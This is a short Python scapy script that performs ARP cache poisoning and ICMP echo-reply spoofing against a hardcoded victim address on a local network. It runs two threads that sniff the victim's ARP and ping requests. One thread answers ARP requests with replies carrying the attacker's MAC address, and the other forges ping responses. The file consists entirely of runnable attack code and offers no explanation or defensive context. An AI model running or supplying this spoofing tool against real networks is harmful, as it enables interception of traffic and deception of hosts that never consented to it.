#!/usr/bin/python
from scapy.all import *
import uuid
import re
import threading


def arp_spoof(arp_request):
    # responding to arp request with a spoofed reply

    # getting attacker machine interface's own mac address
    atk_mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))

    # crafting fake arp response
    arp_reply = Ether() / ARP()
    arp_reply[Ether].dst = arp_request.src
    arp_reply[ARP].hwdst = arp_request.hwsrc
    arp_reply[ARP].hwsrc = atk_mac
    arp_reply[ARP].op = 2  # Operation Code, 2 means Reply
    arp_reply[ARP].psrc = arp_request.pdst
    arp_reply[ARP].pdst = arp_request.psrc
    # arp_reply.show()
    sendp(arp_reply, verbose=False)
    # sendp(arp_reply)


def icmp_spoof(icmp_pkt):
    # responding to icmp ping request with a spoofed reply

    # constructing icmp reply
    icmp_reply = Ether() / IP() / ICMP() / Raw()

    # ethernet layer fields
    icmp_reply[Ether].dst = icmp_pkt.getlayer(Ether).src
    icmp_reply[Ether].src = icmp_pkt.getlayer(Ether).dst

    # IP layer fields
    icmp_reply[IP].src = icmp_pkt.getlayer(IP).dst
    icmp_reply[IP].dst = icmp_pkt.getlayer(IP).src

    # ICMP layer fields
    icmp_reply[ICMP].type = "echo-reply"
    icmp_reply[ICMP].id = icmp_pkt.getlayer(ICMP).id
    icmp_reply[ICMP].seq = icmp_pkt.getlayer(ICMP).seq

    # ICMP data layer field
    icmp_reply[Raw].load = icmp_pkt.getlayer(Raw).load

    # sending icmp reply packet
    sendp(icmp_reply, verbose=False)


def arp_sniff():
    # sniffing arp request and passing it to arp spoof function
    sniff(iface="eth1", filter="arp and src host " + victim_ip, prn=arp_spoof)


def icmp_sniff():
    # sniffing icmp ping request and passing it to icmp spoof function
    sniff(iface="eth1", filter="icmp and src host " + victim_ip, prn=icmp_spoof)


if __name__ == "__main__":
    # ip of victim
    victim_ip = "192.168.11.131"

    # sniffing arp request and passing it on to arp spoofing function
    t1 = threading.Thread(target=arp_sniff, args=())
    t1.start()

    # sniffing icmp request and passing it on to icmp spoofing function
    t2 = threading.Thread(target=icmp_sniff, args=())
    t2.start()
